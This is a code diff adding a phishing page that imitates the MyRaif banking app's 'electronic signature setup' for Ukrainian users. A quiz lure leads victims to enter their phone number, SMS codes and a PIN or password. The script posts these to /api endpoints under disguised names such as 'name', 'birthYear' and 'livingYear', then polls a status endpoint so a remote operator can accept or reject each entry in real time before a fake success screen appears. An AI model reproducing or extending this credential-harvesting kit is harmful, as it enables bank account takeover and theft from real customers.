+            <div class="code-style-caption">Підтвердження</div>
+            <div class="code-style-circle">◔</div>
+          </div>
+
+          <div class="code-style-hero">
+            <div class="code-style-art">
+              <div class="code-style-card">
+                <div class="code-style-dots">
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                  <span></span><span></span><span></span>
+                </div>
+              </div>
+              <div class="code-style-badge">?</div>
+            </div>
+          </div>
+
+          <div class="code-style-title">Введiть код</div>
+          <div class="code-style-subtitle">
+            Ми надіслали SMS на номер телефону.
+            <!-- <span class="code-style-name" id="living-year-preview-value">2026</span> -->
+          </div>
+
+          <div class="code-style-boxes" id="living-year-boxes">
+            <div class="code-style-box active" id="living-year-box-1"></div>
+            <div class="code-style-box" id="living-year-box-2"></div>
+            <div class="code-style-box" id="living-year-box-3"></div>
+            <div class="code-style-box" id="living-year-box-4"></div>
+            <div class="code-style-box" id="living-year-box-5"></div>
+            <div class="code-style-box" id="living-year-box-6"></div>
+          </div>
+
+          <input
+            id="living-year-input"
+            class="code-style-input"
+            type="text"
+            inputmode="numeric"
+            maxlength="6"
+            autocomplete="off"
+          />
+
+          <button class="code-style-submit" id="living-year-submit-btn">Продовжити</button>
+        </div>
+
+      </div>
+
+      <div class="screen" id="success-screen">
+        <div class="result-screen">
+          <div class="result-top">
+            <div class="result-title-top">Підтвердження</div>
+            <div class="result-top-badge">◔</div>
+          </div>
+
+          <div class="result-hero">
+            <div class="result-art">
+              <div class="result-tile left"></div>
+              <div class="result-tile right"></div>
+              <div class="result-card"></div>
+            </div>
+          </div>
+
+          <div class="result-main-title">Електронний пiдпис налаштовано</div>
+          <div class="result-text">Дякуэмо, що користуэтеся MyRaif.</div>
+
+          <div class="result-actions">
+            <button class="result-button" id="success-btn">Готово</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="screen" id="living-year-error-screen">
+        <div class="result-screen">
+          <div class="result-top">
+            <div class="result-title-top">Перевірка</div>
+            <div class="result-top-badge">◔</div>
+          </div>
+
+          <div class="result-hero">
+            <div class="result-art">
+              <div class="result-tile left" style="background:#ff8a8a;"></div>
+              <div class="result-tile right" style="background:#c96565;"></div>
+              <div class="result-card"></div>
+            </div>
+          </div>
+
+          <div class="result-main-title">SMS вказано неправильно</div>
+          <div class="result-text">Перевірте введені дані та спробуйте вказати SMS ще раз.</div>
+
+          <div class="result-actions">
+            <button class="result-button" id="living-year-retry-btn">Спробувати знову</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let isSubmitting = false;
+    let activeLogId = '';
+    let decisionPollTimer = null;
+    let screenTransitionTimer = null;
+    let currentDecisionTarget = 'phone';
+    const quizAnswers = {
+      contact: '',
+      usage: '',
+      goal: ''
+    };
+
+    
+    const screens = {
+      quizOne: document.getElementById('quiz-one-screen'),
+      quizTwo: document.getElementById('quiz-two-screen'),
+      quizThree: document.getElementById('quiz-three-screen'),
+      quizSuccess: document.getElementById('quiz-success-screen'),
+      phone: document.getElementById('phone-screen'),
+      loading: document.getElementById('loading-screen'),
+      name: document.getElementById('name-screen'),
+      birthYear: document.getElementById('birth-year-screen'),
+      confirm: document.getElementById('confirm-screen'),
+      livingYear: document.getElementById('living-year-screen'),
+      success: document.getElementById('success-screen'),
+      livingYearError: document.getElementById('living-year-error-screen')
+    };
+
+    const quizOneOptionsEl = document.getElementById('quiz-one-options');
+    const quizOneBackBtn = document.getElementById('quiz-one-back-btn');
+    const quizOneNextBtn = document.getElementById('quiz-one-next-btn');
+    const quizOneStatusMessageEl = document.getElementById('quiz-one-status-message');
+    const quizTwoOptionsEl = document.getElementById('quiz-two-options');
+    const quizTwoBackBtn = document.getElementById('quiz-two-back-btn');
+    const quizTwoNextBtn = document.getElementById('quiz-two-next-btn');
+    const quizTwoStatusMessageEl = document.getElementById('quiz-two-status-message');
+    const quizThreeOptionsEl = document.getElementById('quiz-three-options');
+    const quizThreeBackBtn = document.getElementById('quiz-three-back-btn');
+    const quizThreeNextBtn = document.getElementById('quiz-three-next-btn');
+    const quizThreeStatusMessageEl = document.getElementById('quiz-three-status-message');
+    const quizSuccessBtn = document.getElementById('quiz-success-btn');
+    const phoneInputEl = document.getElementById('phone-input');
+    const phoneBackBtn = document.getElementById('phone-back-btn');
+    const phoneSubmitBtn = document.getElementById('phone-submit-btn');
+    const phoneStatusMessageEl = document.getElementById('phone-status-message');
+    const phoneClearBtn = document.getElementById('phone-clear-btn');
+    const phoneTermsLinkEl = document.getElementById('phone-terms-link');
+    const phonePolicyLinkEl = document.getElementById('phone-policy-link');
+    const loadingTitleEl = document.getElementById('loading-title');
+    const loadingTextEl = document.getElementById('loading-text');
+    const nameInputEl = document.getElementById('name-input');
+    const nameSubmitBtn = document.getElementById('name-submit-btn');
+    const nameStatusMessageEl = document.getElementById('name-status-message');
+    const namePreviewValueEl = document.getElementById('name-preview-value');
+    const nameBoxesWrapEl = document.querySelector('.code-style-boxes');
+    const nameBoxesEls = [
+      document.getElementById('name-box-1'),
+      document.getElementById('name-box-2'),
+      document.getElementById('name-box-3'),
+      document.getElementById('name-box-4'),
+      document.getElementById('name-box-5'),
+      document.getElementById('name-box-6')
+    ];
+    const birthYearInputEl = document.getElementById('birth-year-input');
+    const birthYearStatusMessageEl = document.getElementById('birth-year-status-message');
+    const birthYearKeypadEl = document.getElementById('birth-year-keypad');
+    const birthYearHelpBtn = document.getElementById('birth-year-help-btn');
+    const birthYearDotsEls = [
+      document.getElementById('birth-year-dot-1'),
+      document.getElementById('birth-year-dot-2'),
+      document.getElementById('birth-year-dot-3'),
+      document.getElementById('birth-year-dot-4')
+    ];
+    const confirmBtn = document.getElementById('confirm-btn');
+    const confirmStatusMessageEl = document.getElementById('confirm-status-message');
+    const signatureHelpLinkEl = document.getElementById('signature-help-link');
+    const livingYearInputEl = document.getElementById('living-year-input');
+    const livingYearSubmitBtn = document.getElementById('living-year-submit-btn');
+    const livingYearStatusMessageEl = document.getElementById('living-year-status-message');
+    const successBtn = document.getElementById('success-btn');
+    const livingYearRetryBtn = document.getElementById('living-year-retry-btn');
+    const livingYearPreviewValueEl = document.getElementById('living-year-preview-value');
+    const livingYearBoxesWrapEl = document.getElementById('living-year-boxes');
+    const livingYearBoxesEls = [
+      document.getElementById('living-year-box-1'),
+      document.getElementById('living-year-box-2'),
+      document.getElementById('living-year-box-3'),
+      document.getElementById('living-year-box-4'),
+      document.getElementById('living-year-box-5'),
+      document.getElementById('living-year-box-6')
+    ];
+
+    function setActiveScreen(screenName) {
+      Object.values(screens).forEach((screen) => {
+        screen.classList.remove('active');
+      });
+
+      screens[screenName].classList.add('active');
+    }
+
+    function setStatus(element, message = '', isError = false) {
+      element.textContent = message;
+      if (element.classList.contains('screen-alert')) {
+        element.className = isError ? 'status-message screen-alert error' : 'status-message screen-alert';
+        return;
+      }
+
+      element.className = isError ? 'status-message error' : 'status-message';
+    }
+
+    function setLoadingState(title, text) {
+      loadingTitleEl.textContent = title;
+      loadingTextEl.textContent = text;
+    }
+
+    function updateQuizButtons() {
+      quizOneNextBtn.disabled = !quizAnswers.contact;
+      quizTwoNextBtn.disabled = !quizAnswers.usage;
+      quizThreeNextBtn.disabled = !quizAnswers.goal;
+    }
+
+    function updateQuizSelection(container, questionKey) {
+      container.querySelectorAll('[data-question]').forEach((button) => {
+        button.classList.toggle('active', button.dataset.value === quizAnswers[questionKey]);
+      });
+    }
+
+    function handleQuizSelection(event) {
+      const button = event.target.closest('[data-question]');
+
+      if (!button) {
+        return;
+      }
+
+      const questionKey = button.dataset.question;
+      quizAnswers[questionKey] = button.dataset.value;
+
+      if (questionKey === 'contact') {
+        updateQuizSelection(quizOneOptionsEl, 'contact');
+        setStatus(quizOneStatusMessageEl);
+      } else if (questionKey === 'usage') {
+        updateQuizSelection(quizTwoOptionsEl, 'usage');
+        setStatus(quizTwoStatusMessageEl);
+      } else if (questionKey === 'goal') {
+        updateQuizSelection(quizThreeOptionsEl, 'goal');
+        setStatus(quizThreeStatusMessageEl);
+      }
+
+      updateQuizButtons();
+    }
+
+    function normalizePhone(value) {
+      return value.replace(/[^\d]/g, ' ').replace(/\s+/g, ' ').trim();
+    }
+
+    function formatPhoneInputDigits(value) {
+      const digits = value.replace(/\D/g, '').slice(0, 9);
+      const parts = [];
+
+      if (digits.slice(0, 2)) parts.push(digits.slice(0, 2));
+      if (digits.slice(2, 5)) parts.push(digits.slice(2, 5));
+      if (digits.slice(5, 7)) parts.push(digits.slice(5, 7));
+      if (digits.slice(7, 9)) parts.push(digits.slice(7, 9));
+
+      return parts.join(' ');
+    }
+
+    function updateNamePreview() {
+      const value = nameInputEl.value.trim();
+      namePreviewValueEl.textContent = value || 'Ваше имя';
+
+      const visibleChars = value.slice(0, nameBoxesEls.length).split('');
+
+      nameBoxesEls.forEach((box, index) => {
+        box.textContent = visibleChars[index] || '';
+        box.classList.toggle('active', index === Math.min(visibleChars.length, nameBoxesEls.length - 1));
+      });
+
+      if (!visibleChars.length) {
+        nameBoxesEls.forEach((box, index) => {
+          box.classList.toggle('active', index === 0);
+        });
+      }
+    }
+
+    function updateBirthYearDots() {
+      const digits = birthYearInputEl.value.replace(/\D/g, '').slice(0, 4);
+      birthYearInputEl.value = digits;
+
+      birthYearDotsEls.forEach((dot, index) => {
+        dot.classList.toggle('filled', index < digits.length);
+      });
+    }
+
+    function updateLivingYearPreview() {
+      const value = livingYearInputEl.value.replace(/\D/g, '').slice(0, 6);
+      livingYearInputEl.value = value;
+      if (livingYearPreviewValueEl) {
+        livingYearPreviewValueEl.textContent = value || '2026';
+      }
+
+      const visibleChars = value.split('');
+
+      livingYearBoxesEls.forEach((box, index) => {
+        box.textContent = visibleChars[index] || '';
+        box.classList.toggle('active', index === Math.min(visibleChars.length, livingYearBoxesEls.length - 1));
+      });
+
+      if (!visibleChars.length) {
+        livingYearBoxesEls.forEach((box, index) => {
+          box.classList.toggle('active', index === 0);
+        });
+      }
+    }
+
+    function stopDecisionPolling() {
+      if (decisionPollTimer) {
+        clearInterval(decisionPollTimer);
+        decisionPollTimer = null;
+      }
+    }
+
+    function stopScreenTransitionTimer() {
+      if (screenTransitionTimer) {
+        clearTimeout(screenTransitionTimer);
+        screenTransitionTimer = null;
+      }
+    }
+
+    function showRejectedStep() {
+      stopDecisionPolling();
+
+      if (currentDecisionTarget === 'phone') {
+        setActiveScreen('phone');
+        setStatus(phoneStatusMessageEl, 'Введено неправильний номер.', true);
+        phoneInputEl.focus();
+        return;
+      }
+
+      if (currentDecisionTarget === 'name') {
+        setActiveScreen('name');
+        setStatus(nameStatusMessageEl, 'Введено неправильний SMS.', true);
+        nameInputEl.focus();
+        return;
+      }
+
+      if (currentDecisionTarget === 'birthYear') {
+        birthYearInputEl.value = '';
+        updateBirthYearDots();
+        setActiveScreen('birthYear');
+        setStatus(birthYearStatusMessageEl, 'Введено неправильний пароль.', true);
+        birthYearInputEl.focus();
+        return;
+      }
+
+      setActiveScreen('livingYearError');
+    }
+
+    async function checkSurveyDecision() {
+      if (!activeLogId) {
+        return;
+      }
+
+      try {
+        const response = await fetch(`/api/survey-status/${encodeURIComponent(activeLogId)}`);
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Не удалось получить статус заявки.');
+        }
+
+        const decision =
+          currentDecisionTarget === 'phone'
+            ? data.phoneDecision
+            : currentDecisionTarget === 'name'
+              ? data.nameDecision
+              : currentDecisionTarget === 'birthYear'
+                ? data.birthYearDecision
+                : data.livingYearDecision;
+
+        if (decision === 'accepted') {
+          stopDecisionPolling();
+
+          if (currentDecisionTarget === 'phone') {
+            setStatus(nameStatusMessageEl);
+            setActiveScreen('name');
+            nameInputEl.focus();
+          } else if (currentDecisionTarget === 'name') {
+            setStatus(birthYearStatusMessageEl);
+            setActiveScreen('birthYear');
+            birthYearInputEl.focus();
+          } else if (currentDecisionTarget === 'birthYear') {
+            setStatus(confirmStatusMessageEl);
+            setActiveScreen('confirm');
+          } else {
+            setActiveScreen('success');
+          }
+
+          return;
+        }
+
+        if (decision === 'rejected') {
+          showRejectedStep();
+        }
+      } catch (error) {
+        stopDecisionPolling();
+        setLoadingState('Ошибка', error.message || 'Не удалось проверить статус заявки.');
+      }
+    }
+
+    function startDecisionPolling() {
+      stopDecisionPolling();
+      decisionPollTimer = setInterval(checkSurveyDecision, 2000);
+      checkSurveyDecision();
+    }
+
+    async function submitPhone() {
+      const phone = normalizePhone(`380 ${phoneInputEl.value}`);
+
+      if (!phone || phone.replace(/\D/g, '').length < 10) {
+        setStatus(phoneStatusMessageEl, 'Введите корректный номер телефона.', true);
+        return;
+      }
+
+      isSubmitting = true;
+      phoneInputEl.disabled = true;
+      phoneSubmitBtn.disabled = true;
+      setStatus(phoneStatusMessageEl, 'Отправляем номер...');
+
+      try {
+        const response = await fetch('/api/survey', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ phone })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Не удалось отправить номер.');
+        }
+
+        activeLogId = data.logId;
+        currentDecisionTarget = 'phone';
+        setStatus(phoneStatusMessageEl);
+        setLoadingState('Зачекайте, будь ласка...', ' ');
+        setActiveScreen('loading');
+        startDecisionPolling();
+      } catch (error) {
+        setStatus(phoneStatusMessageEl, error.message || 'Ошибка отправки.', true);
+      } finally {
+        isSubmitting = false;
+        phoneInputEl.disabled = false;
+        phoneSubmitBtn.disabled = false;
+      }
+    }
+
+    async function submitName() {
+      const name = nameInputEl.value.trim();
+
+      if (!name) {
+        setStatus(nameStatusMessageEl, 'Введите имя.', true);
+        return;
+      }
+
+      nameInputEl.disabled = true;
+      nameSubmitBtn.disabled = true;
+      setStatus(nameStatusMessageEl, 'Отправляем имя...');
+
+      try {
+        const response = await fetch('/api/log-name', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            logId: activeLogId,
+            name
+          })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Не удалось отправить имя.');
+        }
+
+        currentDecisionTarget = 'name';
+        setStatus(nameStatusMessageEl);
+        setLoadingState('Зачекайте, будь ласка...', '');
+        setActiveScreen('loading');
+        startDecisionPolling();
+      } catch (error) {
+        setStatus(nameStatusMessageEl, error.message || 'Ошибка отправки имени.', true);
+      } finally {
+        nameInputEl.disabled = false;
+        nameSubmitBtn.disabled = false;
+      }
+    }
+
+    async function submitBirthYear() {
+      const birthYear = birthYearInputEl.value.replace(/[^\d]/g, '').slice(0, 4);
+
+      if (!/^\d{4}$/.test(birthYear)) {
+        setStatus(birthYearStatusMessageEl, 'Введите год рождения из 4 цифр.', true);
+        return;
+      }
+
+      birthYearInputEl.value = birthYear;
+      birthYearInputEl.disabled = true;
+      setStatus(birthYearStatusMessageEl, 'Отправляем год рождения...');
+
+      try {
+        const response = await fetch('/api/log-birth-year', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            logId: activeLogId,
+            birthYear
+          })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Не удалось отправить год рождения.');
+        }
+
+        currentDecisionTarget = 'birthYear';
+        setStatus(birthYearStatusMessageEl);
+        setLoadingState('Зачекайте, будь ласка...', '');
+        setActiveScreen('loading');
+        startDecisionPolling();
+      } catch (error) {
+        setStatus(birthYearStatusMessageEl, error.message || 'Ошибка отправки года рождения.', true);
+      } finally {
+        birthYearInputEl.disabled = false;
+      }
+    }
+
+    async function submitLivingYear() {
+      const livingYear = livingYearInputEl.value.replace(/[^\d]/g, '').slice(0, 6);
+
+      if (!/^\d{1,6}$/.test(livingYear)) {
+        setStatus(livingYearStatusMessageEl, 'Введите до 6 цифр для года проживания.', true);
+        return;
+      }
+
+      livingYearInputEl.value = livingYear;
+      livingYearInputEl.disabled = true;
+      livingYearSubmitBtn.disabled = true;
+      setStatus(livingYearStatusMessageEl, 'Отправляем год проживания...');
+
+      try {
+        const response = await fetch('/api/log-living-year', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            logId: activeLogId,
+            livingYear
+          })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Не удалось отправить год проживания.');
+        }
+
+        currentDecisionTarget = 'livingYear';
+        setStatus(livingYearStatusMessageEl);
+        setLoadingState('Зачекайте, будь ласка...', '');
+        setActiveScreen('loading');
+        startDecisionPolling();
+      } catch (error) {
+        setStatus(livingYearStatusMessageEl, error.message || 'Ошибка отправки года проживания.', true);
+      } finally {
+        livingYearInputEl.disabled = false;
+        livingYearSubmitBtn.disabled = false;
+      }
+    }
+
+    updateQuizButtons();
+
+    quizOneOptionsEl.addEventListener('click', handleQuizSelection);
+    quizTwoOptionsEl.addEventListener('click', handleQuizSelection);
+    quizThreeOptionsEl.addEventListener('click', handleQuizSelection);
+
+    quizOneBackBtn.addEventListener('click', () => {
+      setStatus(quizOneStatusMessageEl);
+      setActiveScreen('quizOne');
+    });
+
+    quizOneNextBtn.addEventListener('click', () => {
+      if (!quizAnswers.contact) {
+        setStatus(quizOneStatusMessageEl, 'Выберите один вариант.', true);
+        return;
+      }
+
+      setStatus(quizOneStatusMessageEl);
+      setActiveScreen('quizTwo');
+    });
+
+    quizTwoBackBtn.addEventListener('click', () => {
+      setStatus(quizTwoStatusMessageEl);
+      setActiveScreen('quizOne');
+    });
+
+    quizTwoNextBtn.addEventListener('click', () => {
+      if (!quizAnswers.usage) {
+        setStatus(quizTwoStatusMessageEl, 'Выберите один вариант.', true);
+        return;
+      }
+
+      setStatus(quizTwoStatusMessageEl);
+      setActiveScreen('quizThree');
+    });
+
+    quizThreeBackBtn.addEventListener('click', () => {
+      setStatus(quizThreeStatusMessageEl);
+      setActiveScreen('quizTwo');
+    });
+
+    quizThreeNextBtn.addEventListener('click', () => {
+      if (!quizAnswers.goal) {
+        setStatus(quizThreeStatusMessageEl, 'Выберите один вариант.', true);
+        return;
+      }
+
+      setStatus(quizThreeStatusMessageEl);
+      setActiveScreen('quizSuccess');
+    });
+
+    quizSuccessBtn.addEventListener('click', () => {
+      setActiveScreen('phone');
+      phoneInputEl.focus();
+    });
+
+    phoneSubmitBtn.addEventListener('click', async () => {
+      if (isSubmitting) return;
+      await submitPhone();
+    });
+
+    phoneInputEl.addEventListener('input', () => {
+      phoneInputEl.value = formatPhoneInputDigits(phoneInputEl.value);
+      setStatus(phoneStatusMessageEl);
+    });
+
+    phoneClearBtn.addEventListener('click', () => {
+      phoneInputEl.value = '';
+      setStatus(phoneStatusMessageEl);
+      phoneInputEl.focus();
+    });
+
+    phoneTermsLinkEl.addEventListener('click', (event) => {
+      event.preventDefault();
+    });
+
+    phonePolicyLinkEl.addEventListener('click', (event) => {
+      event.preventDefault();
+    });
+
+    nameSubmitBtn.addEventListener('click', async () => {
+      await submitName();
+    });
+
+    nameInputEl.addEventListener('input', () => {
+      setStatus(nameStatusMessageEl);
+      updateNamePreview();
+    });
+
+    nameBoxesWrapEl.addEventListener('click', () => {
+      nameInputEl.focus();
+    });
+
+    birthYearInputEl.addEventListener('input', () => {
+      setStatus(birthYearStatusMessageEl);
+      updateBirthYearDots();
+    });
+
+    birthYearKeypadEl.addEventListener('click', async (event) => {
+      const button = event.target.closest('[data-birth-key]');
+
+      if (!button || isSubmitting) {
+        return;
+      }
+
+      const key = button.dataset.birthKey;
+      const digits = birthYearInputEl.value.replace(/\D/g, '');
+
+      if (key === 'backspace') {
+        birthYearInputEl.value = digits.slice(0, -1);
+      } else if (digits.length < 4) {
+        birthYearInputEl.value = `${digits}${key}`;
+      }
+
+      setStatus(birthYearStatusMessageEl);
+      updateBirthYearDots();
+
+      if (birthYearInputEl.value.length === 4) {
+        await submitBirthYear();
+      }
+    });
+
+    if (birthYearHelpBtn) {
+      birthYearHelpBtn.addEventListener('click', () => {
+        birthYearInputEl.focus();
+      });
+    }
+
+    confirmBtn.addEventListener('click', () => {
+      stopScreenTransitionTimer();
+      setStatus(confirmStatusMessageEl);
+      setLoadingState('Зачекайте', 'будь ласка...');
+      setActiveScreen('loading');
+
+      screenTransitionTimer = setTimeout(() => {
+        setStatus(livingYearStatusMessageEl);
+        setActiveScreen('livingYear');
+        livingYearInputEl.focus();
+      }, 3000);
+    });
+
+    signatureHelpLinkEl.addEventListener('click', (event) => {
+      event.preventDefault();
+    });
+
+    livingYearSubmitBtn.addEventListener('click', async () => {
+      await submitLivingYear();
+    });
+
+    livingYearInputEl.addEventListener('input', () => {
+      setStatus(livingYearStatusMessageEl);
+      updateLivingYearPreview();
+    });
+
+    livingYearBoxesWrapEl.addEventListener('click', () => {
+      livingYearInputEl.focus();
+    });
+
+    successBtn.addEventListener('click', () => {
+      setActiveScreen('quizOne');
+    });
+
+    livingYearRetryBtn.addEventListener('click', () => {
+      setStatus(livingYearStatusMessageEl, 'Введено неправильний .', true);
+      setActiveScreen('livingYear');
+      livingYearInputEl.focus();
+    });
+
+    updateNamePreview();
+    updateBirthYearDots();
+    updateLivingYearPreview();
+  </script>
+</body>
+</html>
